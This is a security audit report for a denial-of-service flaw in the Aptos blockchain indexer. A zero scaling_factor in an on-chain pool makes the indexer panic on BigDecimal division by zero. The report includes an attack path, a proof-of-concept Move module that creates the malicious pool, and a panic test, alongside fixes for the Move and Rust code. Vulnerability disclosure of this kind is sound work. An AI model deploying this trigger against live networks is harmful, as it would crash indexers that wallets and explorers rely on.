# Audit Report

## Title
Indexer Denial of Service via Division by Zero in Pool Scaling Factor Calculations

## Summary
The Aptos indexer crashes with a panic when processing pool resources that have a zero `scaling_factor` value. An attacker can exploit this by deploying a Move module that creates a `pool_u64_unbound::Pool` with `scaling_factor = 0`, causing the indexer to crash repeatedly when processing transactions containing such pools, resulting in a denial of service for blockchain data queries.

## Finding Description

The `PoolResource` struct deserializes the `scaling_factor` field from on-chain pool data as a `BigDecimal`. [1](#0-0) 

This `scaling_factor` is used as a divisor in four critical locations without any validation that it is non-zero:

1. **Active shares calculation in delegation pools**: [2](#0-1) 

2. **Inactive shares calculation in pool resources**: [3](#0-2) 

3. **Active delegator balance calculation**: [4](#0-3) 

4. **Inactive delegator balance calculation**: [5](#0-4) 

The root cause lies in the Move contract side, where the `pool_u64_unbound` module provides a public function to create pools with arbitrary scaling factors: [6](#0-5) 

This function has **no validation** to prevent `scaling_factor` from being zero. Any Move module can call this public function with a zero value.

**Attack Path:**

1. Attacker deploys a custom Move module that uses `aptos_std::pool_u64_unbound`
2. The module calls `pool_u64_unbound::create_with_scaling_factor(0)` to create a malicious pool
3. The pool is stored in a table or as part of a resource on-chain
4. When the indexer processes this transaction, it attempts to deserialize and calculate shares using the zero `scaling_factor`
5. The BigDecimal division operation panics (Rust's `bigdecimal` crate v0.4.0 panics on division by zero) [7](#0-6) 
6. The indexer process crashes and cannot continue processing subsequent blocks
7. Restarting the indexer causes it to crash again when re-processing the same malicious transaction

While the security question asks about "infinite or NaN results," the actual behavior is more severe: BigDecimal division by zero causes a **panic** in Rust, immediately crashing the indexer process rather than producing mathematical edge cases.

## Impact Explanation

This vulnerability qualifies as **Medium severity** under the Aptos bug bounty program criteria: "State inconsistencies requiring intervention."

The indexer is critical infrastructure that:
- Enables blockchain data queries through APIs
- Supports wallet applications, explorers, and dApps
- Provides historical transaction and state data

When the indexer crashes:
- All API endpoints relying on indexed data become unavailable
- Users cannot query balances, transaction history, or NFT metadata
- The system requires manual intervention to either skip the malicious transaction or deploy a patched indexer
- The attacker can repeatedly trigger this vulnerability by creating multiple pools with zero scaling factors

The impact is limited to data availability (not consensus or funds), placing it in the Medium category. However, it could be argued as High severity given that "API crashes" are explicitly listed under High severity criteria.

## Likelihood Explanation

**Likelihood: High**

The attack is highly feasible because:

1. **Low Barrier to Entry**: Any user can deploy a Move module to the blockchain
2. **Public API Surface**: The `create_with_scaling_factor` function is publicly accessible from `aptos_std`
3. **No Validation**: There are no on-chain checks preventing zero scaling factors
4. **Deterministic Trigger**: Once deployed, the malicious pool will reliably crash the indexer
5. **Low Cost**: Deploying a simple Move module requires minimal gas fees
6. **Persistent Effect**: The indexer will crash repeatedly until manually addressed

The only requirement is that the attacker can afford the transaction fees to deploy a Move module, which is a trivial barrier.

## Recommendation

Implement validation at both the Move contract and Rust indexer levels:

**Move Contract Side** - Add validation in `pool_u64_unbound.move`:

```move
/// Create a new pool with custom `scaling_factor`.
public fun create_with_scaling_factor(scaling_factor: u64): Pool {
    assert!(scaling_factor > 0, error::invalid_argument(EZERO_SCALING_FACTOR));
    Pool {
        total_coins: 0,
        total_shares: 0,
        shares: table::new<address, u128>(),
        scaling_factor,
    }
}
```

Add the error constant:
```move
const EZERO_SCALING_FACTOR: u64 = 8;
```

**Rust Indexer Side** - Add defensive checks before division:

```rust
let total_shares = if inner.active_shares.scaling_factor.is_zero() {
    return Err(anyhow::anyhow!(
        "Invalid pool state: scaling_factor is zero at version {}",
        txn_version
    ));
} else {
    &inner.active_shares.total_shares / &inner.active_shares.scaling_factor
};
```

Apply this pattern to all four division sites identified above.

## Proof of Concept

**Move Module to Create Malicious Pool:**

```move
module attacker::malicious_pool {
    use aptos_std::pool_u64_unbound as pool;
    use aptos_std::table;
    
    struct MaliciousResource has key {
        pools: table::Table<u64, pool::Pool>,
    }
    
    public entry fun create_malicious_pool(account: &signer) {
        // Create a pool with zero scaling factor - no validation prevents this
        let bad_pool = pool::create_with_scaling_factor(0);
        
        let pools = table::new<u64, pool::Pool>();
        table::add(&mut pools, 0, bad_pool);
        
        move_to(account, MaliciousResource { pools });
    }
}
```

**Rust Test to Verify Indexer Crash:**

```rust
#[test]
#[should_panic(expected = "Division by zero")]
fn test_zero_scaling_factor_causes_panic() {
    use bigdecimal::BigDecimal;
    use std::str::FromStr;
    
    let total_shares = BigDecimal::from_str("1000").unwrap();
    let scaling_factor = BigDecimal::from_str("0").unwrap();
    
    // This will panic, crashing the indexer
    let result = &total_shares / &scaling_factor;
}
```

When an attacker deploys the Move module and calls `create_malicious_pool`, the indexer will process the resulting transaction, attempt to calculate shares using the zero scaling factor, and immediately crash with a panic.

## Notes

The vulnerability exists because:

1. The `pool_u64_unbound` module is designed as a general-purpose library in `aptos_std`, not restricted to internal use
2. While `delegation_pool` always uses a safe hardcoded constant (`SHARES_SCALING_FACTOR = 10000000000000000`), the underlying pool library has no such protection
3. The indexer processes **all** `pool_u64_unbound::Pool` instances found in table items, not just those from delegation pools [8](#0-7) 
4. BigDecimal arithmetic in Rust panics on division by zero rather than producing `Infinity` or `NaN` (unlike floating-point arithmetic)

This is a real vulnerability requiring immediate patching, as it enables trivial denial of service attacks against the indexer infrastructure.

### Citations

**File:** crates/indexer/src/models/stake_models/stake_utils.rs (L24-33)
```rust
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PoolResource {
    pub shares: SharesInnerResource,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub total_coins: BigDecimal,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub total_shares: BigDecimal,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub scaling_factor: BigDecimal,
}
```

**File:** crates/indexer/src/models/stake_models/stake_utils.rs (L101-106)
```rust
        match data_type {
            "0x1::pool_u64_unbound::Pool" => {
                serde_json::from_value(data.clone()).map(|inner| Some(StakeTableItem::Pool(inner)))
            },
            _ => Ok(None),
        }
```

**File:** crates/indexer/src/models/stake_models/delegator_pools.rs (L131-132)
```rust
            let total_shares =
                &inner.active_shares.total_shares / &inner.active_shares.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_pools.rs (L160-160)
```rust
            let total_shares = &inner.total_shares / &inner.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L90-90)
```rust
            let shares = shares / &pool_balance.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L151-151)
```rust
            let shares = shares / &pool_balance.scaling_factor;
```

**File:** aptos-move/framework/aptos-stdlib/sources/pool_u64_unbound.move (L62-70)
```text
    /// Create a new pool with custom `scaling_factor`.
    public fun create_with_scaling_factor(scaling_factor: u64): Pool {
        Pool {
            total_coins: 0,
            total_shares: 0,
            shares: table::new<address, u128>(),
            scaling_factor,
        }
    }
```

**File:** Cargo.toml (L533-533)
```text
bigdecimal = { version = "0.4.0", features = ["serde"] }
```
